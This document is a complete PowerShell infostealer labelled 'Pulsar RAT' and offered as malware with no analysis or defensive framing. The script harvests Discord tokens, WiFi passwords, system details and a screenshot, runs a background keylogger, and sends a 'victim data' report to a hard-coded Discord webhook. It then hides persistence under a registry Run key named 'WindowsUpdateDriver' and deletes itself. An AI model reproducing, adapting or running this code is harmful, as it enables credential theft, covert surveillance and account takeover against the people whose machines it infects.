# Pulsar RAT – Complete Stealth Data Stealer

$webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"

# === FUNCTION TO SEND DATA TO DISCORD ===
function Send-Discord {
    param($Message, $FilePath = $null)
    $payload = @{content = $Message} | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhook -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        if ($FilePath -and (Test-Path $FilePath)) {
            $bytes = [System.IO.File]::ReadAllBytes($FilePath)
            $boundary = [System.Guid]::NewGuid().ToString()
            $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path $FilePath -Leaf)"
Content-Type: application/octet-stream

$([Convert]::ToBase64String($bytes))
--$boundary--
"@
            Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -ErrorAction SilentlyContinue
        }
    } catch {}
}

# === 1. SYSTEM INFORMATION ===
$computer = $env:COMPUTERNAME
$user = $env:USERNAME
$os = (Get-WmiObject Win32_OperatingSystem).Caption
$publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
$localIPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress -join ", "

# === 2. BROWSER DATA (COOKIES & PASSWORDS) ===
$chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"
$edgePath = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"
$bravePath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default"
$firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"

$browserInfo = ""
if (Test-Path "$chromePath\Cookies") { $browserInfo += "✓ Chrome cookies found`n" }
if (Test-Path "$chromePath\Login Data") { $browserInfo += "✓ Chrome passwords found`n" }
if (Test-Path "$edgePath\Cookies") { $browserInfo += "✓ Edge cookies found`n" }
if (Test-Path "$bravePath\Cookies") { $browserInfo += "✓ Brave cookies found`n" }
if (Test-Path $firefoxPath) { $browserInfo += "✓ Firefox profiles found`n" }

# === 3. DISCORD TOKENS ===
$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\Lightcord\Local Storage\leveldb",
    "$env:APPDATA\Opera Software\Opera Stable\Local Storage\leveldb"
)
$tokens = @()
foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem $path -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
            foreach ($m in $matches) { $tokens += $m.Value }
            $matches2 = [regex]::Matches($content, 'mfa\.[\w-]{84}')
            foreach ($m in $matches2) { $tokens += $m.Value }
        }
    }
}
$tokenReport = if ($tokens) { "DISCORD TOKENS FOUND:`n" + ($tokens -join "`n") } else { "No Discord tokens found" }

# === 4. WIFI PASSWORDS ===
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifiData = ""
foreach ($profile in $wifiProfiles) {
    $result = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    $pass = if ($result) { ($result -split ":")[1].Trim() } else { "Not found" }
    $wifiData += "$profile : $pass`n"
}

# === 5. SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
$screenshotPath = "$env:TEMP\screen.png"
$bitmap.Save($screenshotPath)
$graphic.Dispose()
$bitmap.Dispose()

# === 6. KEYLOGGER (BACKGROUND) ===
$keylogPath = "$env:TEMP\keys.log"
$keyloggerScript = @'
$keys = Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern int GetAsyncKeyState(int vKey);' -Name "Win32" -Namespace API -PassThru
while ($true) {
    Start-Sleep -Milliseconds 50
    for ($i = 8; $i -le 254; $i++) {
        if ($keys::GetAsyncKeyState($i) -band 0x8000) {
            $char = [char]$i
            Add-Content -Path "'$keylogPath'" -Value $char
        }
    }
}
'@
Start-Job -ScriptBlock ([scriptblock]::Create($keyloggerScript))

# === 7. BUILD AND SEND REPORT ===
$report = @"
**🔴 PULSAR RAT - VICTIM DATA**

**Computer:** $computer
**User:** $user
**OS:** $os
**Public IP:** $publicIP
**Local IPs:** $localIPs

**Browser Data:**
$browserInfo

**WiFi Passwords:**
$wifiData

**$tokenReport**

**Keylogger Active:** Yes (logs at $keylogPath)
**Persistence:** Added to Startup
"@

Send-Discord -Message $report
Send-Discord -FilePath $screenshotPath

# === 8. CLEANUP ===
Remove-Item $screenshotPath -Force

# === 9. PERSISTENCE (ADD TO STARTUP) ===
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$currentPath = (Get-Process -Id $pid).Path
Set-ItemProperty -Path $regPath -Name "WindowsUpdateDriver" -Value $currentPath -Force

# === 10. SELF-DELETE (IF RUN FROM TEMP) ===
Start-Sleep -Seconds 10
if ((Get-Location).Path -like "$env:TEMP*") {
    Remove-Item $MyInvocation.MyCommand.Path -Force
}